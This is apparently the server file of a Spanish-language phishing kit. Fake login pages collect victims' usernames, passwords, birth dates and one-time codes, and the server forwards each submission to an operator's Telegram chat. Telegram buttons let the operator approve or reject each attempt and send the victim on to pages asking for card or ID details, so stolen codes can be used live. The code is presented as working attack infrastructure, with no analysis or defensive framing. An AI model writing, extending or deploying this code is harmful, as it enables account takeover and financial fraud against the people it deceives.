// server.js
require('dotenv').config();
const express = require('express');
const app = express();
const http = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
const bodyParser = require('body-parser');

const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });
const telegramChatId = process.env.TELEGRAM_CHAT_ID;
const activeSockets = new Map();

app.use(express.static(path.join(__dirname, 'public')));
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

io.on('connection', (socket) => {
  // Login principal (index.html)
  socket.on('dataForm', ({ usuario, contrasena, fechaNacimiento, sessionId }) => {
    activeSockets.set(sessionId, socket);

    const mensaje = `🔐 Nuevo intento de acceso M1FEL:\n\n🔢 Usuario: ${usuario}\n🔑 Contraseña: ${contrasena}\n📅 Fecha de nacimiento: ${fechaNacimiento || 'No proporcionada'}`;
    const botones = {
      reply_markup: {
        inline_keyboard: [
          [
            { text: '✅ Aceptar', callback_data: `aprobado_${sessionId}` },
            { text: '🚫 Error logo', callback_data: `rechazado_${sessionId}` },
            { text: '🟨 TC', callback_data: `tc_${sessionId}` },
            { text: 'ID', callback_data: `id_${sessionId}` },
            { text: '❌ Error ID', callback_data: `error_id_${sessionId}` }
          ]
        ]
      }
    };

    bot.sendMessage(telegramChatId, mensaje, botones);
  });

  // Login por errorlogo.html
  socket.on('errorlogoForm', ({ usuario, contrasena, fechaNacimiento, sessionId }) => {
    activeSockets.set(sessionId, socket);

    const mensaje = `⚠️ Reintento de acceso tras error M1FEL:\n\n🔢 Usuario: ${usuario}\n🔑 Contraseña: ${contrasena}\n📅 Fecha de nacimiento: ${fechaNacimiento || 'No proporcionada'}`;
    const botones = {
      reply_markup: {
        inline_keyboard: [
          [
            { text: '✅ Aceptar', callback_data: `aprobado_${sessionId}` },
            { text: '🚫 Error logo', callback_data: `rechazado_${sessionId}` },
            { text: '🟨 TC', callback_data: `tc_${sessionId}` },
            { text: 'ID', callback_data: `id_${sessionId}` },
            { text: '❌ Error ID', callback_data: `error_id_${sessionId}` }
          ]
        ]
      }
    };

    bot.sendMessage(telegramChatId, mensaje, botones);
  });

  // Código OTP (bienvenido.html)
  socket.on('codigoIngresado', ({ codigo, sessionId }) => {
    activeSockets.set(sessionId, socket);

    const mensaje = `🔍 El usuario ingresó el siguiente código M1FEL:\n\n🧾 Código: ${codigo}`;
    const botones = {
      reply_markup: {
        inline_keyboard: [
          [
            { text: '❌ Error de código', callback_data: `error_${sessionId}` },
            { text: '✅ Finalizar', callback_data: `finalizar_${sessionId}` },
            { text: '🟨 TC', callback_data: `tc_${sessionId}` }
          ]
        ]
      }
    };

    bot.sendMessage(telegramChatId, mensaje, botones);
  });

  // Redirección "ID"
  socket.on('id', ({ sessionId }) => {
    activeSockets.set(sessionId, socket);
    bot.sendMessage(telegramChatId, `🔐 Redirigiendo al usuario a verifi.html.`);
    socket.emit('redirigir', 'verifi.html');
  });

  // Redirección "Error ID"
  socket.on('error_id', ({ sessionId }) => {
    activeSockets.set(sessionId, socket);
    bot.sendMessage(telegramChatId, `⚠️ Error de ID, redirigiendo al usuario a errorverifi.html.`);
    socket.emit('redirigir', 'errorverifi.html');
  });

  // Reconexión por sessionId
  socket.on('reconectar', (sessionId) => {
    activeSockets.set(sessionId, socket);
  });

  // Redirección desde el cliente
  socket.on("redirigir", ({ url, sessionId }) => {
    const socketTarget = activeSockets.get(sessionId);
    if (socketTarget) {
      socketTarget.emit("redirigir", url);
    }
  });
});

// Respuesta desde Telegram
bot.on('callback_query', (query) => {
  const data = query.data;
  const chatId = query.message.chat.id;
  const callbackId = query.id;

  bot.answerCallbackQuery(callbackId);

  const sessionId = data.split('_')[1];
  const socket = activeSockets.get(sessionId);

  if (!socket) {
    bot.sendMessage(chatId, '⚠️ No se encontró la sesión del usuario.');
    return;
  }

  if (data.startsWith('aprobado_') || data.startsWith('rechazado_')) {
    const decision = data.startsWith('aprobado_') ? 'aprobado' : 'rechazado';
    socket.emit('respuesta', decision);
    bot.sendMessage(chatId, decision === 'aprobado' ? '✅ Acceso aprobado.' : '❌ Acceso denegado.');
  }

  else if (data.startsWith('id_')) {
    socket.emit('id', { sessionId });
    bot.sendMessage(chatId, '🔐 Redirigiendo a verifi.html...');
  }

  else if (data.startsWith('error_id_')) {
    socket.emit('error_id', { sessionId });
    bot.sendMessage(chatId, '⚠️ Error de ID, redirigiendo a errorverifi.html...');
  }

  activeSockets.delete(sessionId);
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`🚀 Servidor escuchando en el puerto ${PORT}`);
});
